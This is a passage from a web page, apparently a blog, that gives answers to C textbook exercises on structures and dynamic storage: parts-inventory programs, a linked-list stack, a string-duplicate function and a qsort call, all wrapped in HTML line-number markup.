class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include "readline.h"</span><br><span class="line"> </span><br><span class="line">#define NAME_LEN 25</span><br><span class="line">#define MAX_PARTS 100</span><br><span class="line"> </span><br><span class="line">struct part {</span><br><span class="line">  int number;</span><br><span class="line">  char name[NAME_LEN+1];</span><br><span class="line">  int on_hand;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">int find_part(int number, const struct part inv[], int np);</span><br><span class="line">void insert(struct part inv[], int *np);</span><br><span class="line">void search(const struct part inv[], int np);</span><br><span class="line">void update(struct part inv[], int np);</span><br><span class="line">void print(const struct part inv[], int np);</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * main: Prompts the user to enter an operation code,     *</span><br><span class="line"> *       then calls a function to perform the requested   *</span><br><span class="line"> *       action. Repeats until the user enters the        *</span><br><span class="line"> *       command 'q'. Prints an error message if the user *</span><br><span class="line"> *       enters an illegal code.                          *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char code;</span><br><span class="line">  struct part inventory[MAX_PARTS];</span><br><span class="line">  int num_parts = 0;</span><br><span class="line"> </span><br><span class="line">  for (;;) {</span><br><span class="line">    printf("Enter operation code: ");</span><br><span class="line">    scanf(" %c", &amp;code);</span><br><span class="line">    while (getchar() != '\n')   /* skips to end of line */</span><br><span class="line">      ;</span><br><span class="line">    switch (code) {</span><br><span class="line">      case 'i': insert(inventory, &amp;num_parts);</span><br><span class="line">                break;</span><br><span class="line">      case 's': search(inventory, num_parts);</span><br><span class="line">                break;</span><br><span class="line">      case 'u': update(inventory, num_parts);</span><br><span class="line">                break;</span><br><span class="line">      case 'p': print(inventory, num_parts);</span><br><span class="line">                break;</span><br><span class="line">      case 'q': return 0;</span><br><span class="line">      default:  printf("Illegal code\n");</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * find_part: Looks up a part number in the inv array.    *</span><br><span class="line"> *            Returns the array index if the part number  *</span><br><span class="line"> *            is found; otherwise, returns -1.            *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int find_part(int number, const struct part inv[], int np)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; np; i++)</span><br><span class="line">    if (inv[i].number == number)</span><br><span class="line">      return i;</span><br><span class="line">  return -1;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * insert: Prompts the user for information about a new   *</span><br><span class="line"> *         part and then inserts the part into the inv    *</span><br><span class="line"> *         array. Prints an error message and returns     *</span><br><span class="line"> *         prematurely if the part already exists or the  *</span><br><span class="line"> *         array is full.                                 *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void insert(struct part inv[], int *np)</span><br><span class="line">{</span><br><span class="line">  int part_number;</span><br><span class="line"> </span><br><span class="line">  if (*np == MAX_PARTS) {</span><br><span class="line">    printf("Database is full; can't add more parts.\n");</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;part_number);</span><br><span class="line">  if (find_part(part_number, inv, *np) &gt;= 0) {</span><br><span class="line">    printf("Part already exists.\n");</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  inv[*np].number = part_number;</span><br><span class="line">  printf("Enter part name: ");</span><br><span class="line">  read_line(inv[*np].name, NAME_LEN);</span><br><span class="line">  printf("Enter quantity on hand: ");</span><br><span class="line">  scanf("%d", &amp;inv[*np].on_hand);</span><br><span class="line">  (*np)++;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * search: Prompts the user to enter a part number, then  *</span><br><span class="line"> *         looks up the part in the inv array. If the     *</span><br><span class="line"> *         part exists, prints the name and quantity on   *</span><br><span class="line"> *         hand; if not, prints an error message.         *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void search(const struct part inv[], int np)</span><br><span class="line">{</span><br><span class="line">  int i, number;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number, inv, np);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Part name: %s\n", inv[i].name);</span><br><span class="line">    printf("Quantity on hand: %d\n", inv[i].on_hand);</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * update: Prompts the user to enter a part number.       *</span><br><span class="line"> *         Prints an error message if the part can't be   *</span><br><span class="line"> *         found in the inv array; otherwise, prompts the *</span><br><span class="line"> *         user to enter change in quantity on hand and   *</span><br><span class="line"> *         updates the array.                             *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void update(struct part inv[], int np)</span><br><span class="line">{</span><br><span class="line">  int i, number, change;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number, inv, np);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Enter change in quantity on hand: ");</span><br><span class="line">    scanf("%d", &amp;change);</span><br><span class="line">    inv[i].on_hand += change;</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * print: Prints a listing of all parts in the inv array, *</span><br><span class="line"> *        showing the part number, part name, and         *</span><br><span class="line"> *        quantity on hand. Parts are printed in the      *</span><br><span class="line"> *        order in which they were entered into the       *</span><br><span class="line"> *        array.                                          *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void print(const struct part inv[], int np)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  printf("Part Number   Part Name                  "</span><br><span class="line">         "Quantity on Hand\n");</span><br><span class="line">  for (i = 0; i &lt; np; i++)</span><br><span class="line">    printf("%7d       %-25s%11d\n", inv[i].number,</span><br><span class="line">           inv[i].name, inv[i].on_hand);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-17"><a href="#Chapter-17" class="headerlink" title="Chapter 17"></a>Chapter 17</h3><h4 id="Answers-to-Selected-Exercises-12"><a href="#Answers-to-Selected-Exercises-12" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">char *duplicate(const char *s)</span><br><span class="line">{</span><br><span class="line">  char *temp = malloc(strlen(s) + 1);</span><br><span class="line"> </span><br><span class="line">  if (temp == NULL)</span><br><span class="line">    return NULL;</span><br><span class="line"> </span><br><span class="line">  strcpy(temp, s);</span><br><span class="line">  return temp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #6] (b) and (c) are legal. (a) is illegal because it tries to reference a member of <code>d</code> without mentioning <code>d</code>. (d) is illegal because it uses <code>-&gt;</code> instead of <code>.</code> to reference the <code>c</code> member of <code>d</code>.</p><p><strong>7.</strong> [was #8] The first call of <code>free</code> will release the space for the first node in the list, making <code>p</code> a dangling pointer. Executing <code>p</code> <code>=</code> <code>p-&gt;next</code> to advance to the next node will have an undefined effect. Here’s a correct way to write the loop, using a temporary pointer that points to the node being deleted: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct node *temp;</span><br><span class="line"> </span><br><span class="line">p = first;</span><br><span class="line">while (p != NULL) {</span><br><span class="line">  temp = p;</span><br><span class="line">  p = p-&gt;next;</span><br><span class="line">  free(temp);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>8.</strong> [was #10; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdbool.h&gt;   /* C99 only */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "stack.h"</span><br><span class="line"> </span><br><span class="line">struct node {</span><br><span class="line">  int value;</span><br><span class="line">  struct node *next;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">struct node *top = NULL;</span><br><span class="line"> </span><br><span class="line">void make_empty(void)</span><br><span class="line">{</span><br><span class="line">  struct node *temp;</span><br><span class="line"> </span><br><span class="line">  while (top != NULL) {</span><br><span class="line">    temp = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    free(temp);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_empty(void)</span><br><span class="line">{</span><br><span class="line">  return top == NULL;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool push(int i)</span><br><span class="line">{</span><br><span class="line">  struct node *new_node;</span><br><span class="line"> </span><br><span class="line">  new_node = malloc(sizeof(struct node));</span><br><span class="line">  if (new_node == NULL)</span><br><span class="line">    return false;</span><br><span class="line"> </span><br><span class="line">  new_node-&gt;value = i;</span><br><span class="line">  new_node-&gt;next = top;</span><br><span class="line">  top = new_node;</span><br><span class="line"> </span><br><span class="line">  return true;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int pop(void)</span><br><span class="line">{</span><br><span class="line">  struct node *temp;</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  if (is_empty()) {</span><br><span class="line">    printf("*** Stack underflow; program terminated. ***\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  i = top-&gt;value;</span><br><span class="line">  temp = top;</span><br><span class="line">  top = top-&gt;next;</span><br><span class="line">  free(temp);</span><br><span class="line"> </span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>15.</strong> [was #12] The output of the program is </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Answer: 3</span><br></pre></td></tr></tbody></table></figure><p>The program tests the values of <code>f2(0)</code>, <code>f2(1)</code>, <code>f2(2)</code>, and so on, stopping when <code>f2</code> returns zero. It then prints the argument that was passed to <code>f2</code> to make it return zero. </p><p><strong>17.</strong> [was #14] Assuming that <code>compare</code> is the name of the comparison function, the following call of <code>qsort</code> will sort the last 50 elements of <code>a</code>: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsort(&amp;a[50], 50, sizeof(a[0]), compare);</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-8"><a href="#Answers-to-Selected-Programming-Projects-8" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #4] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "readline.h"</span><br><span class="line"> </span><br><span class="line">#define NAME_LEN 25</span><br><span class="line">#define INITIAL_PARTS 10</span><br><span class="line"> </span><br><span class="line">struct part {</span><br><span class="line">  int number;</span><br><span class="line">  char name[NAME_LEN+1];</span><br><span class="line">  int on_hand;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">struct part *inventory;</span><br><span class="line">int num_parts = 0;      /* number of parts currently stored */</span><br><span class="line">int max_parts = INITIAL_PARTS;   /* size of inventory array */</span><br><span class="line"> </span><br><span class="line">int find_part(int number);</span><br><span class="line">void insert(void);</span><br><span class="line">void search(void);</span><br><span class="line">void update(void);</span><br><span class="line">void print(void);</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * main: Prompts the user to enter an operation code,     *</span><br><span class="line"> *       then calls a function to perform the requested   *</span><br><span class="line"> *       action. Repeats until the user enters the        *</span><br><span class="line"> *       command 'q'. Prints an error message if the user *</span><br><span class="line"> *       enters an illegal code.                          *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char code;</span><br><span class="line"> </span><br><span class="line">  inventory = malloc(max_parts * sizeof(struct part));</span><br><span class="line">  if (inventory == NULL) {</span><br><span class="line">    printf("Can't allocate initial inventory space.\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  for (;;) {</span><br><span class="line">    printf("Enter operation code: ");</span><br><span class="line">    scanf(" %c", &amp;code);</span><br><span class="line">    while (getchar() != '\n')   /* skips to end of line */</span><br><span class="line">      ;</span><br><span class="line">    switch (code) {</span><br><span class="line">      case 'i': insert();</span><br><span class="line">                break;</span><br><span class="line">      case 's': search();</span><br><span class="line">                break;</span><br><span class="line">      case 'u': update();</span><br><span class="line">                break;</span><br><span class="line">      case 'p': print();</span><br><span class="line">                break;</span><br><span class="line">      case 'q': return 0;</span><br><span class="line">      default:  printf("Illegal code\n");</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * find_part: Looks up a part number in the inventory     *</span><br><span class="line"> *            array. Returns the array index if the part  *</span><br><span class="line"> *            number is found; otherwise, returns -1.     *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int find_part(int number)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; num_parts; i++)</span><br><span class="line">    if (inventory[i].number == number)</span><br><span class="line">      return i;</span><br><span class="line">  return -1;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * insert: Prompts the user for information about a new   *</span><br><span class="line"> *         part and then inserts the part into the        *</span><br><span class="line"> *         database. Prints an error message and returns  *</span><br><span class="line"> *         prematurely if the part already exists or the  *</span><br><span class="line"> *         database is full.                              *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void insert(void)</span><br><span class="line">{</span><br><span class="line">  int part_number;</span><br><span class="line">  struct part *temp;</span><br><span class="line"> </span><br><span class="line">  if (num_parts == max_parts) {</span><br><span class="line">    max_parts *= 2;</span><br><span class="line">    temp = realloc(inventory, max_parts * sizeof(struct part));</span><br><span class="line">    if (temp == NULL) {</span><br><span class="line">      printf("Insufficient memory; can't add more parts.\n");</span><br><span class="line">      return;</span><br><span class="line">    }</span><br><span class="line">    inventory = temp;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;part_number);</span><br><span class="line">  if (find_part(part_number) &gt;= 0) {</span><br><span class="line">    printf("Part already exists.\n");</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  inventory[num_parts].number = part_number;</span><br><span class="line">  printf("Enter part name: ");</span><br><span class="line">  read_line(inventory[num_parts].name, NAME_LEN);</span><br><span class="line">  printf("Enter quantity on hand: ");</span><br><span class="line">  scanf("%d", &amp;inventory[num_parts].on_hand);</span><br><span class="line">  num_parts++;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * search: Prompts the user to enter a part number, then  *</span><br><span class="line"> *         looks up the part in the database. If the part *</span><br><span class="line"> *         exists, prints the name and quantity on hand;  *</span><br><span class="line"> *         if not, prints an error message.               *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void search(void)</span><br><span class="line">{</span><br><span class="line">  int i, number;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Part name: %s\n", inventory[i].name);</span><br><span class="line">    printf("Quantity on hand: %d\n", inventory[i].on_hand);</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * update: Prompts the user to enter a part number.       *</span><br><span class="line"> *         Prints an error message if the part doesn't    *</span><br><span class="line"> *         exist; otherwise, prompts the user to enter    *</span><br><span class="line"> *         change in quantity on hand and updates the     *</span><br><span class="line"> *         database.                                      *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void update(void)</span><br><span class="line">{</span><br><span class="line">  int i, number, change;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Enter change in quantity on hand: ");</span><br><span class="line">    scanf("%d", &amp;change);</span><br><span class="line">    inventory[i].on_hand += change;</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * print: Prints a listing of all parts in the database,  *</span><br><span class="line"> *        showing the part number, part name, and         *</span><br><span class="line"> *        quantity on hand. Parts are printed in the      *</span><br><span class="line"> *        order in which they were entered into the       *</span><br><span class="line"> *        database.                                       *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void print(void)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  printf("Part Number   Part Name                  "</span><br><span class="line">         "Quantity on Hand\n");</span><br><span class="line">  for (i = 0; i &lt; num_parts; i++)</span><br><span class="line">    printf("%7d       %-25s%11d\n", inventory[i].number,</span><br><span class="line">           inventory[i].name, inventory[i].on_hand);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>2.</strong> [was #16] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "readline.h"</span><br><span class="line"> </span><br><span class="line">#define NAME_LEN 25</span><br><span class="line">#define MAX_PARTS 100</span><br><span class="line"> </span><br><span class="line">struct part {</span><br><span class="line">  int number;</span><br><span class="line">  char name[NAME_LEN+1];</span><br><span class="line">  int on_hand;</span><br><span class="line">} inventory[MAX_PARTS];</span><br><span class="line"> </span><br><span class="line">int num_parts = 0;   /* number of parts currently stored */</span><br><span class="line"> </span><br><span class="line">int find_part(int number);</span><br><span class="line">void insert(void);</span><br><span class="line">void search(void);</span><br><span class="line">void update(void);</span><br><span class="line">void print(void);</span><br><span class="line">int compare_parts(const void *p, const void *q);</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * main: Prompts the user to enter an operation code,     *</span><br><span class="line"> *       then calls a function to perform the requested   *</span><br><span class="line"> *       action. Repeats until the user enters the        *</span><br><span class="line"> *       command 'q'. Prints an error message if the user *</span><br><span class="line"> *       enters an illegal code.                          *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char code;</span><br><span class="line"> </span><br><span class="line">  for (;;) {</span><br><span class="line">    printf("Enter operation code: ");</span><br><span class="line">    scanf(" %c", &amp;code);</span><br><span class="line">    while (getchar() != '\n')   /* skips to end of line */</span><br><span class="line">      ;</span><br><span class="line">    switch (code) {</span><br><span class="line">      case 'i': insert();</span><br><span class="line">                break;</span><br><span class="line">      case 's': search();</span><br><span class="line">                break;</span><br><span class="line">      case 'u': update();</span><br><span class="line">                break;</span><br><span class="line">      case 'p': print();</span><br><span class="line">                break;</span><br><span class="line">      case 'q': return 0;</span><br><span class="line">      default:  printf("Illegal code\n");</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * find_part: Looks up a part number in the inventory     *</span><br><span class="line"> *            array. Returns the array index if the part  *</span><br><span class="line"> *            number is found; otherwise, returns -1.     *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int find_part(int number)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; num_parts; i++)</span><br><span class="line">    if (inventory[i].number == 